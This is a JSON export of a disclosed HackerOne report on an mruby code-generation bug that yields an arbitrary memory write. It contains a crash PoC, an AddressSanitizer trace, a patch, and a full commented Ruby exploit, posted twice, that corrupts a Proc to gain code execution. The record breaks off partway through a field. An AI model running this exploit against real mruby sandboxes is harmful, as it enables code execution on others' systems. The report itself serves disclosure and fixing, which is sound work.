{"id":226200,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjYyMDA=","url":"https://hackerone.com/reports/226200","title":"OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-05-04T21:23:52.791Z","submitted_at":"2017-05-04T21:23:52.791Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"avisaven","url":"/avisaven","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-30T14:36:40.301Z","bug_reporter_agreed_on_going_public_at":"2017-05-30T02:25:36.551Z","team_member_agreed_on_going_public_at":"2017-05-30T14:36:40.245Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# PoC\n\n\tx = 0x4242422a\n\ta = *(_\u0026.__=0)\n\ta = *(_\u0026.__=0)\n    \n# Generated Opcodes\n\tirep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0\n\tfile: crashes/b.rb\n\t    3 000 OP_LOADL\tR1\tL(0)\t; 1111638570\t; R1:x\n\t    4 001 OP_ARRAY\tR3\tR3\t0\n\t    4 002 OP_LOADI\tR4\t0\n\t    4 003 OP_ARYCAT\tR2\tR3\t\t; R2:a\n\t    5 004 OP_ARRAY\tR2\tR2\t0\t; R2:a R2:a\n\t    5 005 OP_LOADI\tR3\t0\n\t    5 006 OP_ARYCAT\tR1\tR2\t\t; R1:x R2:a\n\t    5 007 OP_MOVE\tR2\tR1\t\t; R2:a R1:x\n\t    5 008 OP_STOP\n\n# AddressSanitizer\n\n    unknown lhs 30\n    unknown lhs 30\n    ASAN:SIGSEGV\n    =================================================================\n    ==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 0x00010e982109 bp 0x7fff5127b430 sp 0x7fff5127b350 T0)\n        #0 0x10e982108 in ary_concat array.c:265\n        #1 0x10e981faf in mrb_ary_concat array.c:284\n        #2 0x10eb9d788 in mrb_vm_exec vm.c:2404\n        #3 0x10eb71298 in mrb_vm_run vm.c:860\n        #4 0x10ebaea21 in mrb_top_run vm.c:2733\n        #5 0x10ecc118a in mrb_load_exec parse.y:5780\n        #6 0x10ecc1ef1 in mrb_load_file_cxt parse.y:5789\n        #7 0x10e97cdfc in main mruby.c:227\n        #8 0x7fff8f70d5c8 in start (/usr/lib/system/libdyld.dylib+0x35c8)\n        #9 0x1  (\u003cunknown module\u003e)\n\n    AddressSanitizer can not provide additional info.\n    SUMMARY: AddressSanitizer: SEGV array.c:265 ary_concat\n    ==17426==ABORTING\n    [2]    17426 abort      ./mruby/bin/mruby crashes/b.rb\n\n# Analysis\nIn `gen_assignment`, `return;` is used for the `default` case when doing the code generation (line 1029 in mrbgems/mruby-compiler/core/codegen.c). When the LHS is an `NODE_SCALL` it goes to the base case. It returns and never gets to the bottom line `if (val) push(val);` which is necessary for the rest of the code to use the correct register. Because it is not pushed, it uses the register below it in the stack, which allows us to manipulate arguments in an unchecked manner to other opcodes.\n\nIf this is used in conjunction with `OP_ARYCAT` from the splat operator, one could point the destination of OP_ARYCAT to a fake RArray with any arbitrary memory as the ptr, resulting in a memory write (I'm currently experimenting with this to corrupt strings and get code execution). \n\n# Solution\nIn order to fix this, either having the error for improper LHS code generation should either be fatal and kill the program, or switching `return;` to `break;` will fix the error. However, in the future, there should be some level of verification the the destination of `OP_ARYCAT` is actually an RArray to prevent it being used in memory corruptions.\n\n# Versions Affected\n\nThe code above was tested on the latest master. The bug itself appears to have been created in commit `88cd807379152ea3fec5f534e5f4d6ebebd53982`.","vulnerability_information_html":"\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex = 0x4242422a\na = *(_\u0026amp;.__=0)\na = *(_\u0026amp;.__=0)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"generated-opcodes\"\u003eGenerated Opcodes\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eirep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0\nfile: crashes/b.rb\n    3 000 OP_LOADL  R1  L(0)    ; 1111638570    ; R1:x\n    4 001 OP_ARRAY  R3  R3  0\n    4 002 OP_LOADI  R4  0\n    4 003 OP_ARYCAT R2  R3      ; R2:a\n    5 004 OP_ARRAY  R2  R2  0   ; R2:a R2:a\n    5 005 OP_LOADI  R3  0\n    5 006 OP_ARYCAT R1  R2      ; R1:x R2:a\n    5 007 OP_MOVE   R2  R1      ; R2:a R1:x\n    5 008 OP_STOP\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"addresssanitizer\"\u003eAddressSanitizer\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eunknown lhs 30\nunknown lhs 30\nASAN:SIGSEGV\n=================================================================\n==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 0x00010e982109 bp 0x7fff5127b430 sp 0x7fff5127b350 T0)\n    #0 0x10e982108 in ary_concat array.c:265\n    #1 0x10e981faf in mrb_ary_concat array.c:284\n    #2 0x10eb9d788 in mrb_vm_exec vm.c:2404\n    #3 0x10eb71298 in mrb_vm_run vm.c:860\n    #4 0x10ebaea21 in mrb_top_run vm.c:2733\n    #5 0x10ecc118a in mrb_load_exec parse.y:5780\n    #6 0x10ecc1ef1 in mrb_load_file_cxt parse.y:5789\n    #7 0x10e97cdfc in main mruby.c:227\n    #8 0x7fff8f70d5c8 in start (/usr/lib/system/libdyld.dylib+0x35c8)\n    #9 0x1  (\u0026lt;unknown module\u0026gt;)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV array.c:265 ary_concat\n==17426==ABORTING\n[2]    17426 abort      ./mruby/bin/mruby crashes/b.rb\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eIn \u003ccode\u003egen_assignment\u003c/code\u003e, \u003ccode\u003ereturn;\u003c/code\u003e is used for the \u003ccode\u003edefault\u003c/code\u003e case when doing the code generation (line 1029 in mrbgems/mruby-compiler/core/codegen.c). When the LHS is an \u003ccode\u003eNODE_SCALL\u003c/code\u003e it goes to the base case. It returns and never gets to the bottom line \u003ccode\u003eif (val) push(val);\u003c/code\u003e which is necessary for the rest of the code to use the correct register. Because it is not pushed, it uses the register below it in the stack, which allows us to manipulate arguments in an unchecked manner to other opcodes.\u003c/p\u003e\n\n\u003cp\u003eIf this is used in conjunction with \u003ccode\u003eOP_ARYCAT\u003c/code\u003e from the splat operator, one could point the destination of OP_ARYCAT to a fake RArray with any arbitrary memory as the ptr, resulting in a memory write (I\u0026#39;m currently experimenting with this to corrupt strings and get code execution). \u003c/p\u003e\n\n\u003ch1 id=\"solution\"\u003eSolution\u003c/h1\u003e\n\n\u003cp\u003eIn order to fix this, either having the error for improper LHS code generation should either be fatal and kill the program, or switching \u003ccode\u003ereturn;\u003c/code\u003e to \u003ccode\u003ebreak;\u003c/code\u003e will fix the error. However, in the future, there should be some level of verification the the destination of \u003ccode\u003eOP_ARYCAT\u003c/code\u003e is actually an RArray to prevent it being used in memory corruptions.\u003c/p\u003e\n\n\u003ch1 id=\"versions-affected\"\u003eVersions Affected\u003c/h1\u003e\n\n\u003cp\u003eThe code above was tested on the latest master. The bug itself appears to have been created in commit \u003ccode\u003e88cd807379152ea3fec5f534e5f4d6ebebd53982\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":6,"name":"Write-what-where Condition"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-29T02:25:36.609Z","allow_singular_disclosure_after":-110515036.50341673,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","0xspade","spetr0x"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1655217,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-05-04T21:23:52.923Z","updated_at":"2017-05-04T21:23:52.923Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657844,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Attached below is a PoC that gets code execution\n\n    # Setting up our helper functions.  Inspiration and a few code snippets taken\n    # from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\n    def hexchartonum(h)\n      numbase = \"0\".getbyte(0)\n      letterbase = \"a\".getbyte(0)\n      if h \u003c (numbase + 10)\n        return h - numbase\n      else\n        return h - letterbase + 10\n      end\n    end\n\n    def numtohexchar(b)\n      numbase = \"0\".getbyte(0)\n      letterbase = \"a\".getbyte(0)\n      if b \u003c 10\n        return b + numbase\n      else\n        return b - 10 + letterbase\n      end\n    end\n\n    def hextobytes(h)\n      p = \"\\x00\"*6\n      6.times do |i|\n        idx = i*2\n        b = hexchartonum(h.getbyte(idx))\n        b *= 16\n        b += hexchartonum(h.getbyte(idx + 1))\n        p.setbyte(5-i,b)\n      end\n      return p\n    end\n\n    def bytestoint(p)\n      n = 0\n      4.times do |i|\n        n += p.getbyte(i) * (256**i)\n      end\n      return n\n    end\n\n    def inttobytes(n)\n      p = \"\\x00\"*4\n      4.times do |i|\n        b = n% 256\n        p.setbyte(i,b)\n        n = n/256\n      end\n      return p\n    end\n\n    def write(s, b, o=0)\n      b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\n    end\n\n    def addtostr(str, n)\n      str = str.dup\n      write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n      return str\n    end\n\n    # This is the heart of the exploit - our \"clunky\" write primitive.\n    def w(addr, value)\n      # This string is just small enough for its entire contents to be embedded\n      # in the RString.  This is good, since it gives us basically complete control\n      # over the RString's contents.\n      #\n      # We use this complete control to impersonate an RArray.\n      # We start out with zeroes to make sure the length of the \"RArray\" is 0,\n      # and then use large numbers for 'capa' to ensure that it won't try to realloc.\n      # This string perfectly impersonates an RArray with length 0, large capa, and\n      # ptr set to `addr`, which is perfect for concatenating our data into.\n      x = \"\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\"\n      # Here's the kicker.  We load our fake RArray into R2, then we initiate an\n      # array constructor.\n      #\n      # Under ordinary circumstances, an array literal will push the elements of the\n      # array onto the stack one at a time, then construct the array from the elements\n      # all at once.\n      #\n      # However, if you splat another array into an array literal, the array literal\n      # construction will \"cut off\".  It will construct a temporary array to hold\n      # the items collected so far, then it will add further elements using ARYCAT\n      # for splats and ARYPUSH otherwise.\n      #\n      # However, when, in place of a value, we use an assignment with unknown lhs,\n      # such as `_\u0026.__=0x34343434`, this causes the stack to fail to get pushed.\n      # Two things happen as a result of the stack being one less than it should be.\n      #\n      # 1. Instead of containing [_\u0026.__=0x34343434,value], the inner array is actually\n      # created using the temporary array that it was intending to concatenate onto.\n      # As a result, the inner array is generated containing [[], value].\n      #\n      # 2. Instead of being concatenated onto the temporary array, the inner array\n      # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n      # RString impersonating an RArray.  Oops ;)\n      a=x\n      a = [*([_\u0026.__=0x34343434,value])]\n    end\n\n    $overwritestr = \"This string is long enough to not be counted as an embed.\"\n    # By modifying the string after creating it, we disable the sharing flag.\n    $overwritestr.setbyte(0,41)\n\n    # Now we want to locate the address of a string.  We'll do so by taking the\n    # absolute address of this proc and computing an offset using the object_id\n    # method.  This will also handily set up a proc for us to corrupt later.\n    $proc = Proc.new{|a|a*2}\n    $procid = $proc.object_id^13\n    $strid = $overwritestr.object_id^16\n    $diff = $strid - $procid\n    $prochexaddr = $proc.to_s.byteslice(9,12)\n    $procaddr = hextobytes($prochexaddr)\n    $straddr = addtostr($procaddr, $diff)\n\n    # Now we use our \"clunky\" write primitive to corrupt the string.  We write in\n    # this way to put the address of proc in exactly the RString 'ptr' field.\n    # However, our write primitive is \"clunky\", so it cannot write anything user-controlled\n    # without writing some garbage first, and, at best, we can only control every\n    # other 8 bytes.  It just so happens that the layout of data in an empty array\n    # and the layout of the RString struct are helpfully organized so that we can\n    # get a good number in the len field and also write to the ptr field without\n    # corrupting too much other data.\n    w(addtostr($straddr,24),$proc)\n\n    # After corrupting $overwritestr, its ptr is now equal to the address of the\n    # RProc structure. We can now freely use setbyte() calls on the str to modify\n    # the RProc with perfect precision.\n    write($overwritestr, \"\\xFF\\xFF\",1) # Setting all flags to make it a CFunc\n    write($overwritestr, \"AAAAAAAA\", 24) # The address to call\n\n    $proc.call # Winner winner chicken dinner :)\n\nGDB analysis:\n\n\tProcess 25597 stopped\n\t* thread #1: tid = 0xa1bdd, 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)\n\t    frame #0: 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390\n\t   1387\n\t   1388\t      /* prepare stack */\n\t   1389\t      if (MRB_PROC_CFUNC_P(m)) {\n\t-\u003e 1390\t        recv = m-\u003ebody.func(mrb, recv);\n\t   1391\t        mrb_gc_arena_restore(mrb, ai);\n\t   1392\t        if (mrb-\u003eexc) goto L_RAISE;\n\t   1393\t        /* pop stackpos */\n\t(lldb) print m-\u003ebody.func\n\t(mrb_func_t) $1 = 0x4141414141414141","markdown_message":"\u003cp\u003eAttached below is a PoC that gets code execution\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# Setting up our helper functions.  Inspiration and a few code snippets taken\n# from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\ndef hexchartonum(h)\n  numbase = \u0026quot;0\u0026quot;.getbyte(0)\n  letterbase = \u0026quot;a\u0026quot;.getbyte(0)\n  if h \u0026lt; (numbase + 10)\n    return h - numbase\n  else\n    return h - letterbase + 10\n  end\nend\n\ndef numtohexchar(b)\n  numbase = \u0026quot;0\u0026quot;.getbyte(0)\n  letterbase = \u0026quot;a\u0026quot;.getbyte(0)\n  if b \u0026lt; 10\n    return b + numbase\n  else\n    return b - 10 + letterbase\n  end\nend\n\ndef hextobytes(h)\n  p = \u0026quot;\\x00\u0026quot;*6\n  6.times do |i|\n    idx = i*2\n    b = hexchartonum(h.getbyte(idx))\n    b *= 16\n    b += hexchartonum(h.getbyte(idx + 1))\n    p.setbyte(5-i,b)\n  end\n  return p\nend\n\ndef bytestoint(p)\n  n = 0\n  4.times do |i|\n    n += p.getbyte(i) * (256**i)\n  end\n  return n\nend\n\ndef inttobytes(n)\n  p = \u0026quot;\\x00\u0026quot;*4\n  4.times do |i|\n    b = n% 256\n    p.setbyte(i,b)\n    n = n/256\n  end\n  return p\nend\n\ndef write(s, b, o=0)\n  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\nend\n\ndef addtostr(str, n)\n  str = str.dup\n  write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n  return str\nend\n\n# This is the heart of the exploit - our \u0026quot;clunky\u0026quot; write primitive.\ndef w(addr, value)\n  # This string is just small enough for its entire contents to be embedded\n  # in the RString.  This is good, since it gives us basically complete control\n  # over the RString\u0026#39;s contents.\n  #\n  # We use this complete control to impersonate an RArray.\n  # We start out with zeroes to make sure the length of the \u0026quot;RArray\u0026quot; is 0,\n  # and then use large numbers for \u0026#39;capa\u0026#39; to ensure that it won\u0026#39;t try to realloc.\n  # This string perfectly impersonates an RArray with length 0, large capa, and\n  # ptr set to `addr`, which is perfect for concatenating our data into.\n  x = \u0026quot;\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\u0026quot;\n  # Here\u0026#39;s the kicker.  We load our fake RArray into R2, then we initiate an\n  # array constructor.\n  #\n  # Under ordinary circumstances, an array literal will push the elements of the\n  # array onto the stack one at a time, then construct the array from the elements\n  # all at once.\n  #\n  # However, if you splat another array into an array literal, the array literal\n  # construction will \u0026quot;cut off\u0026quot;.  It will construct a temporary array to hold\n  # the items collected so far, then it will add further elements using ARYCAT\n  # for splats and ARYPUSH otherwise.\n  #\n  # However, when, in place of a value, we use an assignment with unknown lhs,\n  # such as `_\u0026amp;.__=0x34343434`, this causes the stack to fail to get pushed.\n  # Two things happen as a result of the stack being one less than it should be.\n  #\n  # 1. Instead of containing [_\u0026amp;.__=0x34343434,value], the inner array is actually\n  # created using the temporary array that it was intending to concatenate onto.\n  # As a result, the inner array is generated containing [[], value].\n  #\n  # 2. Instead of being concatenated onto the temporary array, the inner array\n  # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n  # RString impersonating an RArray.  Oops ;)\n  a=x\n  a = [*([_\u0026amp;.__=0x34343434,value])]\nend\n\n$overwritestr = \u0026quot;This string is long enough to not be counted as an embed.\u0026quot;\n# By modifying the string after creating it, we disable the sharing flag.\n$overwritestr.setbyte(0,41)\n\n# Now we want to locate the address of a string.  We\u0026#39;ll do so by taking the\n# absolute address of this proc and computing an offset using the object_id\n# method.  This will also handily set up a proc for us to corrupt later.\n$proc = Proc.new{|a|a*2}\n$procid = $proc.object_id^13\n$strid = $overwritestr.object_id^16\n$diff = $strid - $procid\n$prochexaddr = $proc.to_s.byteslice(9,12)\n$procaddr = hextobytes($prochexaddr)\n$straddr = addtostr($procaddr, $diff)\n\n# Now we use our \u0026quot;clunky\u0026quot; write primitive to corrupt the string.  We write in\n# this way to put the address of proc in exactly the RString \u0026#39;ptr\u0026#39; field.\n# However, our write primitive is \u0026quot;clunky\u0026quot;, so it cannot write anything user-controlled\n# without writing some garbage first, and, at best, we can only control every\n# other 8 bytes.  It just so happens that the layout of data in an empty array\n# and the layout of the RString struct are helpfully organized so that we can\n# get a good number in the len field and also write to the ptr field without\n# corrupting too much other data.\nw(addtostr($straddr,24),$proc)\n\n# After corrupting $overwritestr, its ptr is now equal to the address of the\n# RProc structure. We can now freely use setbyte() calls on the str to modify\n# the RProc with perfect precision.\nwrite($overwritestr, \u0026quot;\\xFF\\xFF\u0026quot;,1) # Setting all flags to make it a CFunc\nwrite($overwritestr, \u0026quot;AAAAAAAA\u0026quot;, 24) # The address to call\n\n$proc.call # Winner winner chicken dinner :)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGDB analysis:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProcess 25597 stopped\n* thread #1: tid = 0xa1bdd, 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)\n    frame #0: 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390\n   1387\n   1388       /* prepare stack */\n   1389       if (MRB_PROC_CFUNC_P(m)) {\n-\u0026gt; 1390         recv = m-\u0026gt;body.func(mrb, recv);\n   1391         mrb_gc_arena_restore(mrb, ai);\n   1392         if (mrb-\u0026gt;exc) goto L_RAISE;\n   1393         /* pop stackpos */\n(lldb) print m-\u0026gt;body.func\n(mrb_func_t) $1 = 0x4141414141414141\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-05-06T05:00:20.016Z","updated_at":"2017-05-06T05:00:20.016Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657846,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a patch to fix the bug\n\n    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c\n    index f863ef33..d04ff44b 100644\n    --- a/mrbgems/mruby-compiler/core/codegen.c\n    +++ b/mrbgems/mruby-compiler/core/codegen.c\n    @@ -1026,7 +1026,7 @@ gen_assignment(codegen_scope *s, node *tree, int sp, int val)\n     #ifndef MRB_DISABLE_STDIO\n         fprintf(stderr, \"unknown lhs %d\\n\", type);\n     #endif\n    -    return;\n    +    break;\n       }\n       if (val) push();\n     }\n","markdown_message":"\u003cp\u003eHere\u0026#39;s a patch to fix the bug\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c\nindex f863ef33..d04ff44b 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/mrbgems/mruby-compiler/core/codegen.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/mrbgems/mruby-compiler/core/codegen.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1026,7 +1026,7 @@\u003c/span\u003e gen_assignment(codegen_scope *s, node *tree, int sp, int val)\n #ifndef MRB_DISABLE_STDIO\n     fprintf(stderr, \u0026quot;unknown lhs %d\\n\u0026quot;, type);\n #endif\n\u003cspan class=\"gd\"\u003e-    return;\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    break;\n\u003c/span\u003e   }\n   if (val) push();\n }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-05-06T05:09:10.430Z","updated_at":"2017-05-06T05:09:10.430Z","actor":{"username":"avisaven","cleared":false,"url":"/avisaven","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1659149,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you are having trouble executing the above PoC, on some compilers the .to_s method for Procs works differently. This version of the PoC should fix that:\n\n\t# Setting up our helper functions.  Inspiration and a few code snippets taken\n\t# from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)\n\n\tdef hexchartonum(h)\n\t  numbase = \"0\".getbyte(0)\n\t  letterbase = \"a\".getbyte(0)\n\t  if h \u003c (numbase + 10)\n\t    return h - numbase\n\t  else\n\t    return h - letterbase + 10\n\t  end\n\tend\n\n\tdef numtohexchar(b)\n\t  numbase = \"0\".getbyte(0)\n\t  letterbase = \"a\".getbyte(0)\n\t  if b \u003c 10\n\t    return b + numbase\n\t  else\n\t    return b - 10 + letterbase\n\t  end\n\tend\n\n\tdef hextobytes(h)\n\t  p = \"\\x00\"*6\n\t  6.times do |i|\n\t    idx = i*2\n\t    b = hexchartonum(h.getbyte(idx))\n\t    b *= 16\n\t    b += hexchartonum(h.getbyte(idx + 1))\n\t    p.setbyte(5-i,b)\n\t  end\n\t  return p\n\tend\n\n\tdef bytestoint(p)\n\t  n = 0\n\t  4.times do |i|\n\t    n += p.getbyte(i) * (256**i)\n\t  end\n\t  return n\n\tend\n\n\tdef inttobytes(n)\n\t  p = \"\\x00\"*4\n\t  4.times do |i|\n\t    b = n% 256\n\t    p.setbyte(i,b)\n\t    n = n/256\n\t  end\n\t  return p\n\tend\n\n\tdef write(s, b, o=0)\n\t  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\n\tend\n\n\tdef addtostr(str, n)\n\t  str = str.dup\n\t  write(str, inttobytes(bytestoint(str.slice(0,4))+n))\n\t  return str\n\tend\n\n\t# Parse a Proc's .to_s() and add leading zeroes.\n\tdef parseProcStr(s)\n\t  start = 9\n\t  finish = s.index('@')\n\t  slice = s.byteslice(start, finish-start)\n\t  addr = \"0\"*12\n\t  write(addr, slice, 12-slice.length)\n\t  return addr\n\tend\n\n\t# This is the heart of the exploit - our \"clunky\" write primitive.\n\tdef w(addr, value)\n\t  # This string is just small enough for its entire contents to be embedded\n\t  # in the RString.  This is good, since it gives us basically complete control\n\t  # over the RString's contents.\n\t  #\n\t  # We use this complete control to impersonate an RArray.\n\t  # We start out with zeroes to make sure the length of the \"RArray\" is 0,\n\t  # and then use large numbers for 'capa' to ensure that it won't try to realloc.\n\t  # This string perfectly impersonates an RArray with length 0, large capa, and\n\t  # ptr set to `addr`, which is perfect for concatenating our data into.\n\t  x = \"\\x00\\x00\\x00\\x00AAAAAAAAAAAA#{addr}\"\n\t  # Here's the kicker.  We load our fake RArray into R2, then we initiate an\n\t  # array constructor.\n\t  #\n\t  # Under ordinary circumstances, an array literal will push the elements of the\n\t  # array onto the stack one at a time, then construct the array from the elements\n\t  # all at once.\n\t  #\n\t  # However, if you splat another array into an array literal, the array literal\n\t  # construction will \"cut off\".  It will construct a temporary array to hold\n\t  # the items collected so far, then it will add further elements using ARYCAT\n\t  # for splats and ARYPUSH otherwise.\n\t  #\n\t  # However, when, in place of a value, we use an assignment with unknown lhs,\n\t  # such as `_\u0026.__=0x34343434`, this causes the stack to fail to get pushed.\n\t  # Two things happen as a result of the stack being one less than it should be.\n\t  #\n\t  # 1. Instead of containing [_\u0026.__=0x34343434,value], the inner array is actually\n\t  # created using the temporary array that it was intending to concatenate onto.\n\t  # As a result, the inner array is generated containing [[], value].\n\t  #\n\t  # 2. Instead of being concatenated onto the temporary array, the inner array\n\t  # is concatenated directly onto R2, i.e. `a`, which is currently holding our\n\t  # RString impersonating an RArray.  Oops ;)\n\t  a=x\n\t  a = [*([_\u0026.__=0x34343434,value])]\n\tend\n\n\t$overwritestr = \"This string is long enough to not be counted as an embed.\"\n\t# By modifying the string after creating it, we disable the sharing flag.\n\t$overwritestr.setbyte(0,41)\n\n\t# Now we want to locate the address of a string.  We'll do so by taking the\n\t# absolute address of this proc and computing an offset using the object_id\n\t# method.  This will also handily set up a proc for us to corrupt later.\n\t$proc = Proc.new{|a|a*2}\n\t$procid = $proc.object_id^13\n\t$strid = $overwritestr.object_id^16\n\t$diff = $strid - $procid\n\t$prochexaddr = parseProcStr($proc.to_s)\n\t$procaddr = hextobytes($prochexaddr)\n\t$straddr = addtostr($procaddr, $diff)\n\n\t# Now we use our \"clunky\" write primitive to corrupt the string.  We write in\n\t# this way to put the address of proc in exactly the RString 'ptr' field.\n\t# However, our write primitive is \"clunky\", so it cannot write anything user-controlled\n\t# without writing some garbage first, and, at best, we can only control every\n\t# other 8 bytes.  It just so happens that the layout of data in an empty array\n\t# and the layout of the RString struct are helpfully organized so that we can\n\t# get a good number in the len field and also write to the ptr field without\n\t# corrupting too much other data.\n\tw(addtostr($straddr,24),$proc)\n\n\t# After corrupting $overwritestr, its ptr is now equal to the address of the\n\t# RProc structure. We can now freely use setbyte() calls on the str to modify\n\t# the RProc with perfect precision.\n\twrite($overwritestr, \"\\xFF\\xFF\",1) # Setting all flags to make it a CFunc\n\twrite($overwritestr, \"AAAAAAAA\", 24) # The address to call\n\n\t$proc.call # Winner winner chicken dinner :)\n","markdown_message":"\u003cp\u003eIf you are having trouble executing the above PoC, on some compilers the .to_s method for Procs works differently. This version of the PoC should fix 